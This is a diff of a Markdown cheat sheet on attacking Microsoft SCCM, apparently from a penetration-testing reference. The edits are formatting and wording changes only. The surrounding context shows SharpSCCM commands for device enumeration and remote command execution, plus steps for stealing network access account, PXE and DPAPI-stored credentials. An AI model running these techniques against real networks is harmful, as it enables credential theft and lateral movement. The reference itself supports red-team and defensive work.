@@ -10,7 +10,7 @@
 
 * Using **SharpSCCM**
   ```ps1
-  .\SharpSCCM.exe get device --server <SERVER8NAME> --site-code <SITE_CODE>
+  .\SharpSCCM.exe get devices --server <SERVER8NAME> --site-code <SITE_CODE>
   .\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
   .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
   ``` 
@@ -81,13 +81,13 @@
 
 * [Misconfiguration-Manager - CRED-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md)
 
-Requirements:
+**Requirements**:
 
 * On the SCCM Distribution Point: `HKLM\Software\Microsoft\SMS\DP\PxeInstalled` = 1
 * On the SCCM Distribution Point: `HKLM\Software\Microsoft\SMS\DP\IsPxe` = 1
 * PXE-enabled distribution point
 
-Exploitation:
+**Exploitation**:
 
 * [csandker/pxethiefy](https://github.com/csandker/pxethiefy)
     ```ps1
@@ -101,12 +101,12 @@ Exploitation:
 * [Misconfiguration-Manager - CRED-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md)
 
 
-Requirements:
+**Requirements**:
 
 * PKI certificates are not required for client authentication
 * Domain accounts credential
 
-Exploitation:
+**Exploitation**:
 
 Create a machine or compromise an existing one, then request policies such as `NAAConfig`
 
@@ -116,7 +116,7 @@ SharpSCCM get naa
 ```
 
 
-### CRED-3 Extract currently deployed credentials stored as DPAPI blobs and decrypt
+### CRED-3 Extract currently deployed credentials stored as DPAPI blobs
 
 > Dump currently deployed secrets via WMI. If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.
 
@@ -158,7 +158,7 @@ From a remote machine.
     ```
 
 
-### CRED-4 Extract legacy credentials stored as DPAPI blobs and decrypt
+### CRED-4 Extract legacy credentials stored as DPAPI blobs
 
 * [Misconfiguration-Manager - CRED-4](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-4/cred-4_description.md)
 
@@ -187,7 +187,7 @@ From a remote machine.
 
 
 
-### CRED-5 Extract and decrypt the SC_UserAccount table from the site database
+### CRED-5 Extract the SC_UserAccount table from the site database
 
 * [Misconfiguration-Manager - CRED-5](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-5/cred-5_description.md)
 
